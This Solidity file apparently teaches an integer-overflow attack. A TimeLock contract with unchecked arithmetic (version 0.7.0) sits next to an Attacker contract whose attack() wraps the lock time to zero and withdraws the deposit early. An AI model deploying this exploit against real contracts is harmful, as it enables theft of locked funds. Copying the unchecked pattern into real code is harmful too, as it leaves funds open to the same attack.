// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.7.0;

contract TimeLock {
    mapping (address => uint) public balances;
    mapping (address => uint) public lockTime;

    function deposit() external payable{ // to deposit
        balances[msg.sender] += msg.value;
        lockTime[msg.sender] += block.timestamp + 1 weeks;
    }

    function withdraw() external { // to withdraw
        uint bal = balances[msg.sender]; 
        require(bal > 0, "No balance to withdraw");
        require(lockTime[msg.sender] <= block.timestamp, "Time left yet");

        balances[msg.sender] = 0; // updating before sending, to avoid reentrancy

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Send ETH failed");
    }

    function increaseTimeLimit(uint _seconds) external { // to increase lock time
        lockTime[msg.sender] += _seconds;
    }
}



contract Attacker { // since public variables cannot be accessed using interface, we need the TimeLock code
    TimeLock timeLockContract;
    receive() external payable{
    }

    constructor(address _timeLock) {
        timeLockContract = TimeLock(_timeLock);
    }

    function deposit() external payable {
        timeLockContract.deposit{value: msg.value}();
    }

    function attack() external {
        timeLockContract.increaseTimeLimit(uint(-timeLockContract.lockTime(address(this))));
        timeLockContract.withdraw();      
    }

    function tryGetBack() external {
        timeLockContract.withdraw();  
    }

    function getBalance() external view returns(uint) {
        return address(this).balance;
    }

}
